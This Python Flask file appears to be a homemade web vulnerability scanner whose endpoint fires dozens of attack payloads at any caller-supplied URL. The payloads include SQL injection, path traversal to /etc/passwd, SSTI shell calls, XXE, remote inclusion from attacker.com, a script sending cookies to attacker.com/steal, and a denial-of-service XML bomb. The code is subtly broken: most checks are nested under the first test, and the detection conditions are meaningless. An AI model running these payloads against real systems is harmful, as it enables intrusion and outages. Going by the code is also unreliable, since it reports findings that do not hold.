import requests
from flask import Blueprint, request,jsonify

vulnurabilities = Blueprint("vulnurability", __name__)
# Define the URL of the website you want to test
@vulnurabilities.route("/check_url/", methods=['POST'])
def vul():
    # url = request.json['url']
    url = request.json['url']
    vulnurability = []

    try:
        # Check for directory traversal vulnerability
        response = requests.get(url + "../../../../etc/passwd")
        if response.status_code == 200:
            vulnurability.append("Directory Traversal Vulnerability Detected!")

            # Check for SQL injection vulnerability
            payload = "1' OR '1'='1"
            response = requests.get(url + "/products?id=" + payload)
            if "error" in response.text:
                vulnurability.append("SQL Injection Vulnerability Detected!")

            # Check for XSS vulnerability
            payload = "<script>alert('XSS')</script>"
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                vulnurability.append("XSS Vulnerability Detected!")

            # Check for Command Injection vulnerability
            payload = "127.0.0.1; ls"
            response = requests.get(url + "/ping?host=" + payload)
            if "etc" in response.text:
                vulnurability.append("Command Injection Vulnerability Detected!")

            # Check for Remote File Inclusion vulnerability
            payload = "http://attacker.com/malicious_script.php"
            response = requests.get(url + "/file?file=" + payload)
            if "Attacker's Content" in response.text:
                vulnurability.append("Remote File Inclusion Vulnerability Detected!")

            # Check for Server-Side Request Forgery (SSRF) vulnerability
            payload = "http://localhost/admin"
            response = requests.get(url + "/fetch?url=" + payload)
            if "Sensitive Admin Page" in response.text:
                vulnurability.append("SSRF Vulnerability Detected!")

            # Check for Unvalidated Redirect vulnerability
            payload = "https://www.attacker.com"
            response = requests.get(url + "/redirect?to=" + payload)
            if "example.com" not in response.url:
                vulnurability.append("Unvalidated Redirect Vulnerability Detected!")

            # Check for Cross-Site Request Forgery (CSRF) vulnerability
            response = requests.get(url, cookies={"session_id": "malicious_session"})
            if "Unauthorized Action Performed" in response.text:
                vulnurability.append("CSRF Vulnerability Detected!")

            # Check for Remote Code Execution (RCE) vulnerability
            payload = "'; system('id'); //"
            response = requests.get(url + "/command?cmd=" + payload)
            if "uid" in response.text:
                vulnurability.append("Remote Code Execution Vulnerability Detected!")

            # Check for Cross-Site Script Inclusion (XSSI) vulnerability
            payload = "https://www.attacker.com/xssi.js"
            response = requests.get(url + "/xssi?file=" + payload)
            if "Sensitive Information" in response.text:
                vulnurability.append("Cross-Site Script Inclusion Vulnerability Detected!")

            # Check for File Upload vulnerability
            # files = {"file": open("malicious_file.php", "rb")}
            # response = requests.post(url + "/upload", files=files)
            # if "File Uploaded Successfully" in response.text:
            #     vulnurability.append("File Upload Vulnerability Detected!")

            # Check for Insecure Direct Object Reference (IDOR) vulnerability
            response = requests.get(url + "/profile?id=123")
            if "Unauthorized Access" in response.text:
                vulnurability.append("Insecure Direct Object Reference Vulnerability Detected!")

            # Check for XML External Entity (XXE) vulnerability
            payload = "<?xml version='1.0' encoding='ISO-8859-1'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
            response = requests.post(url, data=payload)
            if "root:x" in response.text:
                vulnurability.append("XML External Entity (XXE) Vulnerability Detected!")

            # Check for Server-Side Template Injection (SSTI) vulnerability
            payload = "{{7*'7'}}"
            response = requests.post(url, data={"template": payload})
            if "49" in response.text:
                vulnurability.append("Server-Side Template Injection (SSTI) Vulnerability Detected!")

            # Check for Remote Code Inclusion (RCI) vulnerability
            payload = "https://attacker.com/malicious_script.php"
            response = requests.get(url + "?file=" + payload)
            if "Attacker's Code Executed" in response.text:
                vulnurability.append("Remote Code Inclusion (RCI) Vulnerability Detected!")

            # Check for Server-Side Template Injection (SSTI) vulnerability (for specific templating engines like Jinja2)
            payload = "{{ ''._class.__mro[1].__subclasses_()[80]('id') }}"
            response = requests.post(url, data={"template": payload})
            if "uid" in response.text:
                vulnurability.append("Server-Side Template Injection (SSTI) Vulnerability Detected!")

            # Check for Insecure Deserialization vulnerability
            payload = {"data": "H4sIAAAAAAAA//NIzcnJVyjPL8pJUQQAAP//"}
            response = requests.post(url, data=payload)
            if "Command Executed Successfully" in response.text:
                vulnurability.append("Insecure Deserialization Vulnerability Detected!")

            # Check for Server-Side Request Forgery (SSRF) via DNS rebinding vulnerability
            payload = "http://internal-server.local"
            response = requests.get(url + "/api?endpoint=" + payload)
            if "Internal Resource Contents" in response.text:
                vulnurability.append("Server-Side Request Forgery (SSRF) via DNS rebinding Vulnerability Detected!")

            # Check for Clickjacking vulnerability
            response = requests.get(url)
            if "DENY" not in response.headers.get("X-Frame-Options", ""):
                vulnurability.append("Clickjacking Vulnerability Detected!")

            # Check for Security Misconfiguration
            response = requests.get(url + "/admin")
            if response.status_code == 200 and "Default Credentials" in response.text:
                vulnurability.append("Security Misconfiguration Vulnerability Detected!")

            # Check for Cross-Site Scripting (XSS) via DOM-based vulnerability
            payload = "<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>"
            response = requests.post(url, data={"input": payload})
            if "Attacker's Domain" in response.text:
                vulnurability.append("Cross-Site Scripting (XSS) via DOM-based Vulnerability Detected!")

            # Check for Open Redirect vulnerability
            payload = "https://www.attacker.com"
            response = requests.get(url + "?redirect=" + payload)
            if "example.com" not in response.url:
                vulnurability.append("Open Redirect Vulnerability Detected!")

            # Check for Cross-Origin Resource Sharing (CORS) misconfiguration
            response = requests.get(url)
            if response.headers.get("Access-Control-Allow-Origin", "") == "*":
                vulnurability.append("Cross-Origin Resource Sharing (CORS) Misconfiguration Detected!")

            # Check for HTTP Header Injection vulnerability
            # payload = "User-Agent: Malicious/1.0\r\nX-Forwarded-For: 127.0.0.1\r\n"
            # response = requests.get(url, headers={"Injection": payload})
            # if "Malicious Response" in response.text:
            #     vulnurability.append("HTTP Header Injection Vulnerability Detected!")

            # Check for Cross-Site Script Inclusion (XSSI) via JSON vulnerability
            payload = ")]}', {'data': '<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>'}"
            response = requests.get(url + "/data?format=json", headers={"Accept": "application/json"})
            if "Attacker's Domain" in response.text:
                vulnurability.append("Cross-Site Script Inclusion (XSSI) via JSON Vulnerability Detected!")

            # Check for Content Security Policy (CSP) bypass
            response = requests.get(url)
            if "unsafe-inline" in response.headers.get("Content-Security-Policy", ""):
                vulnurability.append("Content Security Policy (CSP) Bypass Vulnerability Detected!")

            # Check for Insecure Cross-Origin Resource Sharing (CORS) configuration
            response = requests.get(url)
            if response.headers.get("Access-Control-Allow-Credentials", "") == "true":
                vulnurability.append("Insecure Cross-Origin Resource Sharing (CORS) Configuration Detected!")

            # Check for HTTP Parameter Pollution vulnerability
            payload = {"param": "value1", "param": "value2"}
            response = requests.get(url, params=payload)
            if response.status_code == 200 and "Data Corruption Detected" in response.text:
                vulnurability.append("HTTP Parameter Pollution Vulnerability Detected!")

            # Check for Server-Side Request Forgery (SSRF) via File Upload vulnerability
            # files = {"file": open("file.txt", "rb")}
            # response = requests.post(url + "/upload", files=files, data={"path": "file:///etc/passwd"})
            # if "root:x" in response.text:
            #     vulnurability.append("Server-Side Request Forgery (SSRF) via File Upload Vulnerability Detected!")

            # Check for Insufficient Transport Layer Protection
            response = requests.get(url)
            if "Password Input Form" in response.text and "https://" not in response.text:
                vulnurability.append("Insufficient Transport Layer Protection Vulnerability Detected!")

            # Check for Business Logic Flaws
            response = requests.post(url + "/checkout", data={"item_id": "123", "price": "0.01"})
            if response.status_code == 200 and "Payment Accepted" not in response.text:
                vulnurability.append("Business Logic Flaw Vulnerability Detected!")

            # Check for Insecure Cross-Site WebSocket Hijacking
            payload = "wss://attacker.com"
            response = requests.get(url + "/ws?endpoint=" + payload)
            if "Attacker's WebSocket Connection" in response.text:
                vulnurability.append("Insecure Cross-Site WebSocket Hijacking Vulnerability Detected!")

            # Check for Server-Side Request Forgery (SSRF) via Server-Side Template Injection (SSTI)
            payload = "{{config._class.__init.__globals_['os'].popen('id').read()}}"
            response = requests.post(url, data={"template": payload})
            if "uid" in response.text:
                vulnurability.append("SSRF via SSTI Vulnerability Detected!")

            # Check for Server-Side Request Forgery (SSRF) via DNS Rebinding
            payload = "http://internal-server.local"
            response = requests.get(url + "/api?endpoint=" + payload)
            if "Internal Resource Contents" in response.text:
                vulnurability.append("SSRF via DNS Rebinding Vulnerability Detected!")

            # Check for Cross-Site Script Inclusion (XSSI) via JSONP
            payload = "<script src='https://attacker.com/xssi.js'></script>"
            response = requests.get(url + "/data?callback=" + payload)
            if "Sensitive Information" in response.text:
                vulnurability.append("XSSI via JSONP Vulnerability Detected!")

            # Check for Server-Side Denial of Service (DoS) via XML Bomb
            payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE bomb [<!ENTITY a "&#x26;#x41;"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;"><!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;"><!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;"><!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;"><!ENTITY i "&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;"><!ENTITY j "&i;&i;&i;&i;&i;&i;&i;&i;&i;&i;"><!ENTITY k "&j;&j;&j;&j;&j;&j;&j;&j;&j;&j;"><!ENTITY l "&k;&k;&k;&k;&k;&k;&k;&k;&k;&k;"><!ENTITY m "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;"><!ENTITY n "&m;&m;&m;&m;&m;&m;&m;&m;&m;&m;"><!ENTITY o "&n;&n;&n;&n;&n;&n;&n;&n;&n;&n;"><!ENTITY p "&o;&o;&o;&o;&o;&o;&o;&o;&o;&o;"><!ENTITY q "&p;&p;&p;&p;&p;&p;&p;&p;&p;&p;"><!ENTITY r "&q;&q;&q;&q;&q;&q;&q;&q;&q;&q;"><!ENTITY s "&r;&r;&r;&r;&r;&r;&r;&r;&r;&r;"><!ENTITY t "&s;&s;&s;&s;&s;&s;&s;&s;&s;&s;"><!ENTITY u "&t;&t;&t;&t;&t;&t;&t;&t;&t;&t;"><!ENTITY v "&u;&u;&u;&u;&u;&u;&u;&u;&u;&u;"><!ENTITY w "&v;&v;&v;&v;&v;&v;&v;&v;&v;&v;"><!ENTITY x "&w;&w;&w;&w;&w;&w;&w;&w;&w;&w;"><!ENTITY y "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;"><!ENTITY z "&y;&y;&y;&y;&y;&y;&y;&y;&y;&y;">]><root>&z;</root>'
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                vulnurability.append("Server-Side DoS via XML Bomb Vulnerability Detected!")

            # Check for Security Headers Misconfiguration
            response = requests.get(url)
            if "Content-Security-Policy" not in response.headers:
                vulnurability.append("Security Headers Misconfiguration Detected!")

            # Check for Cross-Site Request Forgery (CSRF) via Flash
            payload = '''
            <!DOCTYPE html>
            <html>
            <body>
                <h1>CSRF via Flash</h1>
                <object data="https://attacker.com/flash.swf"></object>
            </body>
            </html>
            '''
            response = requests.post(url, data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if "Unauthorized Action Performed" in response.text:
                vulnurability.append("CSRF via Flash Vulnerability Detected!")

            # Check for Server-Side Template Injection (SSTI) via Twig
            payload = "{{7*'7'}}"
            response = requests.post(url, data={"template": payload})
            if "49" in response.text:
                vulnurability.append("SSTI via Twig Vulnerability Detected!")

            # Check for Cross-Site Scripting (XSS) via SVG
            payload = '''
            <svg xmlns="http://www.w3.org/2000/svg">
            <script>alert('XSS')</script>
            </svg>
            '''
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                vulnurability.append("XSS via SVG Vulnerability Detected!")

            # Check for Server-Side Request Forgery (SSRF) via XXE
            payload = '''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [<!ENTITY % remote SYSTEM "http://internal-server.local"> %remote;]>
            <root></root>
            '''
            response = requests.post(url, data=payload)
            if "Internal Resource Contents" in response.text:
                vulnurability.append("SSRF via XXE Vulnerability Detected!")

            # Check for Open Redirect vulnerability via data: URL
            payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgnSFRUUCBXSVRIIFJFUE9SVCcpPC9zY3JpcHQ+"
            response = requests.get(url + "?redirect=" + payload)
            if "example.com" not in response.url:
                vulnurability.append("Open Redirect via data: URL Vulnerability Detected!")

            # Check for Insecure Direct Object Reference (IDOR) vulnerability
            response = requests.get(url + "/profile?id=999")
            if "Unauthorized Access" in response.text:
                vulnurability.append("Insecure Direct Object Reference Vulnerability Detected!")

            # Check for SQL Injection vulnerability via UNION-based attack
            payload = "1' UNION SELECT null,version(),user()--"
            response = requests.get(url + "/products?id=" + payload)
            if "error" in response.text:
                vulnurability.append("SQL Injection via UNION-based Attack Vulnerability Detected!")

            # Check for XML External Entity (XXE) vulnerability
            payload = '''
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE test [<!ENTITY % remote SYSTEM "http://internal-server.local"> %remote;]>
            <root></root>
            '''
            response = requests.post(url, data=payload)
            if "Internal Resource Contents" in response.text:
                vulnurability.append("XXE Vulnerability Detected!")

            # Check for Remote File Inclusion (RFI) vulnerability
            payload = "http://attacker.com/malicious-script.php"
            response = requests.get(url + "?file=" + payload)
            if "Malicious Content" in response.text:
                vulnurability.append("RFI Vulnerability Detected!")

            # Check for Unvalidated Redirect vulnerability
            redirect_url = "https://malicious-site.com"
            response = requests.get(url + "?redirect=" + redirect_url)
            if redirect_url not in response.url:
                vulnurability.append("Unvalidated Redirect Vulnerability Detected!")

            # Check for Command Injection vulnerability
            command = "ls /tmp"
            payload = f"test; {command};"
            response = requests.get(url + "?param=" + payload)
            if "file1.txt" in response.text:
                vulnurability.append("Command Injection Vulnerability Detected!")

            # Check for Local File Inclusion (LFI) vulnerability
            file_path = "/etc/passwd"
            payload = f"../../../../../../..{file_path}"
            response = requests.get(url + "?file=" + payload)
            if "root:x:0:0" in response.text:
                vulnurability.append("LFI Vulnerability Detected!")

            # Check for Cross-Site Scripting (XSS) via JavaScript execution
            payload = "<img src=x onerror=alert('XSS')>"
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                vulnurability.append("XSS via JavaScript Execution Vulnerability Detected!")

            # Check for Remote Code Execution (RCE) vulnerability via deserialization
            payload = "gAN9cQAoWAUAAABkYXRhYmFzZXF0eXBlCnEAXgAAAGV4aXQoKVgFAAAAaW5jbHVkaW5nCnEARgBAAAAAA=="
            response = requests.post(url, data=payload)
            if "RCE Successful" in response.text:
                vulnurability.append("RCE via Deserialization Vulnerability Detected!")

            # Check for Cross-Site Scripting (XSS) via HTML injection
            payload = "<script>alert('XSS')</script>"
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                vulnurability.append("XSS via HTML Injection Vulnerability Detected!")

            # Check for File Upload vulnerability
            file_content = b"<html><body><h1>Uploaded File</h1></body></html>"
            files = {"file": ("uploaded.html", file_content)}
            response = requests.post(url, files=files)
            if "Upload Successful" in response.text:
                vulnurability.append("File Upload Vulnerability Detected!")

            # Check for Cross-Site Scripting (XSS) via Stored XSS
            payload = "<script>alert('XSS')</script>"
            response = requests.post(url, data={"comment": payload})
            if payload in response.text:
                vulnurability.append("Stored XSS Vulnerability Detected!")

            # Check for Cross-Site Request Forgery (CSRF) vulnerability
            response = requests.post(url, data={"action": "delete", "id": "123"})
            if "Action Successful" in response.text:
                vulnurability.append("CSRF Vulnerability Detected!")

            # Check for Remote Code Execution (RCE) vulnerability via eval
            payload = "eval('_import_(\\'os\\').popen(\\'id\\').read()')"
            response = requests.post(url, data={"input": payload})
            if "uid" in response.text:
                vulnurability.append("RCE via eval Vulnerability Detected!")

            # Check for Cross-Site Scripting (XSS) via DOM-based XSS
            payload = "<script>document.write(document.domain)</script>"
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                vulnurability.append("DOM-based XSS Vulnerability Detected!")

            # Check for Command Injection vulnerability via shell metacharacters
            command = "ls /tmp"
            payload = f"test; {command}"
            response = requests.get(url + "?param=" + payload)
            if "file1.txt" in response.text:
                vulnurability.append("Command Injection via Shell Metacharacters Vulnerability Detected!")

            # Check for Insecure Deserialization vulnerability
            payload = "gAN9cQBYAQAAAGV4ZWN1dGlvbl90aW1lcXVhbGl0eQFyBAAAAHRpbWVvdXQKWAUAAABleGVjdXRpb25faWQKcQFXAQAAAGlkcQJYBAAAAGFjdGl2ZV9pZApxAkcBAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQ1SAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFhSgAAAHZhbHVlCnEKSgMAAAByZWxlYXNlCnEKVgUAAABpZApxCUQCAAAAZGF0YXRhYmluZC5jb21fXwBWAUAAAHRpbWUKcQhLAwAAAHN0cmluZ19mcm9udF90aW1lCnEKYUsCAAAAdmFsdWUKcQpSAAAAZGF0YXRhYmluZC5jb21fXwFeAQAAD3N0cmluZ19mcm9udF90aW1lCnFRawAAAA=="
            response = requests.post(url, data=payload)
            if "Insecure Deserialization Detected!" in response.text:
                vulnurability.append("Insecure Deserialization Vulnerability Detected!")

    except Exception as e:
        vulnurability.append("An error occurred: " + str(e))

    return jsonify(vulnurability),200